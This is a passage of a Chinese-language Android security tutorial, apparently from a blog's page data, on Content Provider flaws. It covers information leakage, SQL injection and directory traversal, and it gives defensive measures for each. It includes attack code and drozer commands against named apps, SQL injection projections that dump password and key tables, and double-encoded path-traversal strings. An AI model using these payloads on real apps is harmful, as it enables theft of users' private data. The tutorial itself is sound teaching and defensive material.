class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">provider</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.providers.YouNiProvider&quot;</span> <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;com.snda.youni.mms&quot;</span> <span class=\"attr\">android:authorities</span>=<span class=\"string\">&quot;com.snda.youni.providers.DataStructs&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">getyouni</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    ContentResolver contentresolver=getContentResolver();</span><br><span class=\"line\">    String[] projection=&#123;<span class=\"string\">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span>Uri.parse(<span class=\"string\">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class=\"line\">    Cursor cursor=contentresolver.query(uri.projection,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">    String text=<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(cursor.moveToNext())&#123;</span><br><span class=\"line\">        text+=cursor.getString(cursor.getColumnIndex(<span class=\"string\">&quot;display_name&quot;</span>))+<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Log.i(<span class=\"string\">&quot;TEST&quot;</span>,text);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>代码分析：</p>\n<p>我们可以分析目标程序的provider的进程名和授权的的URI，我们可以根据授权的URI来构建一个URI，然后通过contentresolver去读取里面的的列表名信息，这样我们就可以获取APP中的隐私数据信息。</p>\n<p><strong>案例2：样例sieve.apk</strong></p>\n<p>我们先向apk中添加一条数据，然后保存：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/8.png\" alt=\"image-20210922111855304\"></p>\n<p>我们先使用drozer对内容提供器的路径进行扫描：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run scanner.provider.finduris -a &lt;包名&gt;</span><br></pre></td></tr></table></figure>\n\n<p>报错：drozer could not find or compile a required extension library</p>\n<p>这是由于我们drozer2.7中代码导致的，我们需要修改相应的代码，参考网址(<a href=\"https://github.com/FSecureLABS/drozer/issues/361\">https://github.com/FSecureLABS/drozer/issues/361</a> )</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/9.png\" alt=\"image-20210922111855304\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/10.png\" alt=\"image-20210922111855304\"></p>\n<p>我们可以对敏感数据读取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.provider.query uri</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/11.png\" alt=\"image-20210922112523603\"></p>\n<p>我们就成功的将我们刚才保存的账号密码信息给获取了</p>\n<p>案例3：<a href=\"https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/\">CVE-2018-9546: Download Provider文件头信息泄露</a></p>\n<p>漏洞描述：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。</span><br></pre></td></tr></table></figure>\n\n<p>目标代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">读取header的URI为：content:<span class=\"comment\">//download/mydownloads/download_id/headers</span></span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://download/mydownloads/1493/headers&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Cursor</span> <span class=\"variable\">cur</span> <span class=\"operator\">=</span> res.query(uri, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cur != <span class=\"literal\">null</span> &amp;&amp; cur.getCount() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">StringBuilder</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(LOG_SEPARATOR);</span><br><span class=\"line\">        sb.append(<span class=\"string\">&quot;HEADERS FOR DOWNLOAD ID &quot;</span>).append(id).append(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (cur.moveToNext()) &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">rowHeader</span> <span class=\"operator\">=</span> cur.getString(cur.getColumnIndex(<span class=\"string\">&quot;header&quot;</span>));</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">rowValue</span> <span class=\"operator\">=</span> cur.getString(cur.getColumnIndex(<span class=\"string\">&quot;value&quot;</span>));</span><br><span class=\"line\">            sb.append(rowHeader).append(<span class=\"string\">&quot;: &quot;</span>).append(rowValue).append(<span class=\"string\">&quot;\\n\\n&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        log(sb.toString());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cur != <span class=\"literal\">null</span>)</span><br><span class=\"line\">        cur.close();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于header的URI并未做一些防护措施，我们可以将download_id取具体的值，然后来获取里面的具体信息</p>\n<h4 id=\"（3）安全防护\"><a href=\"#（3）安全防护\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>minSdkVersion不低于<span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"number\">2.</span>不向外部app提供数据的私有content provider显示设置exported=”<span class=\"literal\">false</span>”，避免组件暴露(编译api小于<span class=\"number\">17</span>时更应注意此点)</span><br><span class=\"line\"><span class=\"number\">3.</span>内部app通过content provid交换数据时，设置protectionLevel=”signature”验证签名</span><br><span class=\"line\"><span class=\"number\">4.</span>公开的content provider确保不存储敏感数据</span><br><span class=\"line\"></span><br><span class=\"line\">针对权限保护绕过防御措施：</span><br><span class=\"line\"><span class=\"number\">1.</span>使用Context.checkCallingPermission()和Context.enforceCallingPermission()来确保调用者拥有相应的权限，防止串谋攻击(confused deputy)。</span><br><span class=\"line\"><span class=\"number\">2.</span>可以使用如下函数，获取应用的permission保护级别是否与系统中已定义的permission保护级别一致。如果不一致，则抛出异常。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-SQL注入漏洞\"><a href=\"#3-SQL注入漏洞\" class=\"headerlink\" title=\"3.SQL注入漏洞\"></a>3.SQL注入漏洞</h3><h4 id=\"（1）原理介绍-1\"><a href=\"#（1）原理介绍-1\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致sql注入攻击。</span><br><span class=\"line\">所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。应该避免使用SQLiteDatabase.rawQuery()进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。</span><br><span class=\"line\">另外一种方式是使用query(),insert(),update(),和delete()方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使bindString()绑定值。从而避免SQL注入攻击。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现-1\"><a href=\"#（2）漏洞复现-1\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p><strong>案例1：<a href=\"http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086899\">安全管家客户端存在SQL注入攻击</a></strong></p>\n<p>漏洞说明：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android版安全管家客户端contentprovider uri配置不当，导致sql注入，使得任何应用可不需要root权限下，获得和修改数据库中数据。</span><br></pre></td></tr></table></figure>\n\n<p>Androidmanifest文件中定义的provider：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/14.png\" alt=\"image-20210922112523603\"></p>\n<p>使用drozer扫描客户端程序存在的contentProvider uri:</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/15.png\" alt=\"image-20210922112523603\"></p>\n<p>搜索到对外暴露可访问的uri:</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/16.png\" alt=\"image-20210922112523603\"></p>\n<p>newapp.db结构：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/17.png\" alt=\"image-20210922112523603\"></p>\n<p>查看新安装应用的包名：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/18.png\" alt=\"image-20210922112523603\"></p>\n<p>查看白名单：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/19.png\" alt=\"image-20210922112523603\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/20.png\" alt=\"image-20210922112523603\"></p>\n<p><strong>案例2：样本sieve</strong></p>\n<p>我们使用drozer扫描注入的位置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run scanner.provider.injection -a &lt;包名&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/21.png\" alt=\"image-20210922112523603\"></p>\n<p>然后我们执行以下命令，发现返回了报错信息，接着构造sql获取敏感数据</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class=\"line\">run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/22.png\" alt=\"image-20210922112523603\"></p>\n<p>列出所有表信息：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot; </span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/23.png\" alt=\"image-20210922112523603\"></p>\n<p>获取具体表信息</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/24.png\" alt=\"image-20210922112523603\"></p>\n<p>列出该app的表信息</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/25.png\" alt=\"image-20210922112523603\"></p>\n<p>案例3：<a href=\"https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/\">CVE-2018-9493: Download Provider SQL注入</a></p>\n<p>漏洞分析：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Download Provider中的以下columns是不允许被外部访问的，例如CookieData，但是利用SQL注入漏洞可以绕过这个限制。</span><br><span class=\"line\">projection参数存在注入漏洞，结合二分法可以爆出某些columns字段的内容。</span><br></pre></td></tr></table></figure>\n\n<p>目标代码：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/26.png\" alt=\"image-20210922131649440\"></p>\n<p>攻击代码：</p>\n<p>详细可以参考该作者博客：(<a href=\"https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/\">https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a>)</p>\n<h4 id=\"（3）安全防护-1\"><a href=\"#（3）安全防护-1\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>实现健壮的服务端校验</span><br><span class=\"line\"><span class=\"number\">2.</span>使用参数化查询语句，比如SQLiteStatement</span><br><span class=\"line\"><span class=\"number\">3.</span>避免使用rawQuery()</span><br><span class=\"line\"><span class=\"number\">4.</span>过滤用户的输入</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-目录遍历漏洞\"><a href=\"#4-目录遍历漏洞\" class=\"headerlink\" title=\"4.目录遍历漏洞\"></a>4.目录遍历漏洞</h3><h4 id=\"（1）原理介绍-2\"><a href=\"#（1）原理介绍-2\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android Content Provider存在文件目录遍历安全漏洞，该漏洞源于对外暴露Content Provider组件的应用，没有对Content Provider组件的访问进行权限控制和对访问的目标文件的Content Query Uri进行有效判断，攻击者利用该应用暴露的Content Provider的openFile()接口进行文件目录遍历以达到访问任意可读文件的目的</span><br></pre></td></tr></table></figure>\n\n<p>漏洞触发的前提条件：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">对外暴露的Content Provider组件实现了openFile()接口</span><br><span class=\"line\">没有对所访问的目标文件Uri进行有效判断，如没有过滤限制如“../”可实现任意可读文件的访问的Content Query Uri</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现-2\"><a href=\"#（2）漏洞复现-2\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例1：<a href=\"http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044407\">赶集网Android客户端Content Provider组件任意文件读取漏洞</a></p>\n<p>漏洞分析：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">赶集网客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=<span class=\"string\">&quot;true&quot;</span>,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过<span class=\"string\">&quot;../&quot;</span>实现目录跨越，实现对任意私有数据的访问（当然，也可以访问任意外部存储数据，只是我们更关心私有敏感数据）。</span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">GJContentProviderFileOperations</span><span class=\"params\">()</span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123; </span><br><span class=\"line\">\t    <span class=\"type\">InputStream</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> getContentResolver().openInputStream(Uri.parse(<span class=\"string\">&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;</span>)); </span><br><span class=\"line\">\t\t<span class=\"type\">ByteArrayOutputStream</span> <span class=\"variable\">out</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>(); </span><br><span class=\"line\">\t\t<span class=\"type\">byte</span>[] buffer = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[<span class=\"number\">1024</span>]; </span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"variable\">n</span> <span class=\"operator\">=</span> in.read(buffer); </span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(n&gt;<span class=\"number\">0</span>)&#123; </span><br><span class=\"line\">\t\t    out.write(buffer, <span class=\"number\">0</span>, n); </span><br><span class=\"line\">\t\t\tn = in.read(buffer); </span><br><span class=\"line\">\t\t\tToast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show(); </span><br><span class=\"line\">\t    &#125; </span><br><span class=\"line\">\t&#125;<span class=\"keyword\">catch</span>(Exception e)&#123; </span><br><span class=\"line\">\t    debugInfo(e.getMessage()); </span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>案例2：样本sieve</strong></p>\n<p>我们检测文件遍历漏洞：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run scanner.provider.traversal -a &lt;包名&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/27.png\" alt=\"image-20210922131649440\"></p>\n<p>我们读取系统文件：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.provider.read content:<span class=\"comment\">//com.mwr.example.sieve.FileBackupProvider/etc/hosts</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/28.png\" alt=\"image-20210922131649440\"></p>\n<p>我们下载系统文件：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.provider.download content:<span class=\"comment\">//com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/29.png\" alt=\"image-20210922131649440\"></p>\n<p>案例3：</p>\n<p>目标代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class=\"line\"><span class=\"keyword\">public</span> ParcelFileDescriptor <span class=\"title function_\">openFile</span><span class=\"params\">(Uri paramUri,String paramString)</span>;</span><br><span class=\"line\"><span class=\"keyword\">throws</span> FileNotFoundException&#123;</span><br><span class=\"line\">    File file=<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(IMAGE_DIRECTORY,paramUri.getLastPathSegment());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以从目标代码中分析，这段代码使用android.net.Uri.getLastPathSegment()从paramUri中获取文件名，然后将其放置在预定义好的目录IMAGE_DIRECTORY中，如果该URL是encoded编码后的，那么将可能导致目录遍历漏洞</p>\n<p>Android4.3开始，Uri.getLastPathSegment()内部实现调用Uri.getPathSegments()</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Uri.getPathSegments()部分代码片段：  </span><br><span class=\"line\">PathSegments <span class=\"title function_\">getPathSegments</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(pathSegments!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> pathSegments;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">path</span> <span class=\"operator\">=</span> getEncoded();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(path==<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"type\">return</span> <span class=\"variable\">pathSegments</span> <span class=\"operator\">=</span> PathSegments.EMPTY;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    PathSegmentsBuilder segmentBuilder=<span class=\"keyword\">new</span> <span class=\"title class_\">PathSegmentsBuilder</span>();</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">previous</span> <span class=\"operator\">=</span><span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> current;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((current=path.indexOf(<span class=\"string\">&#x27;/&#x27;</span>,previous))&gt;-<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(previous&lt;current)&#123;</span><br><span class=\"line\">            String decodedSegment=decode(path.substring(previous,current));</span><br><span class=\"line\">            segmentBuilder.add(decodedSegment);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        previous=current+<span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(previous&lt;path.length())&#123;</span><br><span class=\"line\">        segmentBuilder.add(decode(path.substring(preyious)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pathSegments=segmentBuilder.build();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Uri.getPathSegments首先会通过getEncoded()获取一个路径，然后以”&#x2F;“为分隔符将path分成片段，最后调用decode()方法解码</p>\n<p>假如我们传递encoded编码后的url给getLastPathSegment()，编码后的分隔符就变成了%2F,绕过了内部的分割规则，那么返回的就可能不是真正想要的文件了。这是API设计方面的问题，直接导致了目录遍历漏洞</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">getLastPathSegment</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    List&lt;String&gt; segments=getPathSegments();</span><br><span class=\"line\">    <span class=\"type\">int</span> size=segments.size();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(size==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> segments.get(size-<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>为了避免这种情况导致的目录遍历漏洞，开发者应该在传递给getLastPathSegment()之前解码，采用调用两次getLastPathSegment()方法的方式，第一次调用是为了解码，第二次调用期望得到正确的值这一部分大家可以详细参考博客：(<a href=\"https://tea9.xyz/post/758430476.html\">https://tea9.xyz/post/758430476.html</a>)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class=\"line\">    <span class=\"keyword\">public</span> ParcelFileDescriptor <span class=\"title function_\">openFile</span><span class=\"params\">(Uri paramUri,String paramString)</span> <span class=\"keyword\">throws</span> FileNotFoundException&#123;</span><br><span class=\"line\">        File file=<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">这个编码后的URL： ..%<span class=\"number\">2F</span>..%<span class=\"number\">2F</span>..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml   </span><br><span class=\"line\">第一次调用getLastPathSegment()，会返回../../../data/data/com.example.android.app/shared_prefs/Example.xml。   </span><br><span class=\"line\">第二次调用getLastPathSegment()会返回Example.xml  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">然而攻击者可以采用一种叫做<span class=\"string\">&quot;Double Encoding&quot;</span>的技术，使得第一次调用getLastPathSegment()后无法解码。 </span><br><span class=\"line\"></span><br><span class=\"line\">比如下面经过<span class=\"type\">double</span> encoded后的string就可以绕过上面这种防御</span><br><span class=\"line\"></span><br><span class=\"line\">%252E%252E%<span class=\"number\">252F</span>%252E%252E%<span class=\"number\">252F</span>%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml </span><br><span class=\"line\"></span><br><span class=\"line\">第一次解码后： %2E%2E%<span class=\"number\">2F</span>%2E%2E%<span class=\"number\">2F</span>%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml</span><br><span class=\"line\"></span><br><span class=\"line\">第二次解码后： ../../../data/data/com.example.android.app/shared_prefs/Example.xml </span><br><span class=\"line\">仍会导致目录遍历。所以简单的解码后再传人也是不够的，仍然需要严格校验以确保path是期望的路径。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）安全防护-2\"><a href=\"#（3）安全防护-2\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> 将不必要导出的Content Provider设置为不导出</span><br><span class=\"line\"><span class=\"number\">2.</span> 去除没有必要的openFile()接口</span><br><span class=\"line\"><span class=\"number\">3.</span> 过滤限制跨域访问，对访问的目标文件的路径进行有效判断</span><br><span class=\"line\"><span class=\"number\">4.</span> 设置权限来进行内部应用通过Content Provider的数据共享</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、实验总结\"><a href=\"#四、实验总结\" class=\"headerlink\" title=\"四、实验总结\"></a>四、实验总结</h2><p>本文对Content Provider内容提供器的基本原理做了一个详细讲解，然后对Provider常见的一些漏洞情况作了分析，这里面一部分漏洞来自于漏洞平台，一部分来自于网上的博客收集总结，还提供了一个样例sieve.apk，初步的实现信息泄露、SQL注入、目录遍历漏洞的基本操作方式，也介绍了一般挖掘provider漏洞的基本方法，其中关于drozer的具体操作使用，大家可以参考之前的博客：<a href=\"https://bbs.pediy.com/thread-269196.htm\">Android漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF</a>，当然可能对于Provider中的漏洞介绍还不是很全面，其他的就请各位大佬指正了。</p>\n<h2 id=\"五、参考文献\"><a href=\"#五、参考文献\" class=\"headerlink\" title=\"五、参考文献\"></a>五、参考文献</h2><p>Content Provider原理介绍</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//www.cnblogs.com/tgyf/p/4696288.html</span></span><br><span class=\"line\">https:<span class=\"comment\">//www.jianshu.com/p/5e13d1fec9c9</span></span><br><span class=\"line\">https:<span class=\"comment\">//www.cnblogs.com/huansky/p/13785634.html</span></span><br><span class=\"line\">http:<span class=\"comment\">//www.tutorialspoint.com/android/android_content_providers.htm</span></span><br></pre></td></tr></table></figure>\n\n<p>Content Provider漏洞挖掘</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//tea9.xyz/post/758430476.html</span></span><br><span class=\"line\">https:<span class=\"comment\">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br><span class=\"line\">https:<span class=\"comment\">//wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0156386</span></span><br><span class=\"line\">http:<span class=\"comment\">//www.feidao.site/wordpress/?p=3295</span></span><br><span class=\"line\">http:<span class=\"comment\">//www.hackdig.com/03/hack-19497.htm</span></span><br><span class=\"line\">https:<span class=\"comment\">//mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</span></span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（13）——权限安全和安全配置漏洞详解","url":"/2023/02/13/bug0013/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" 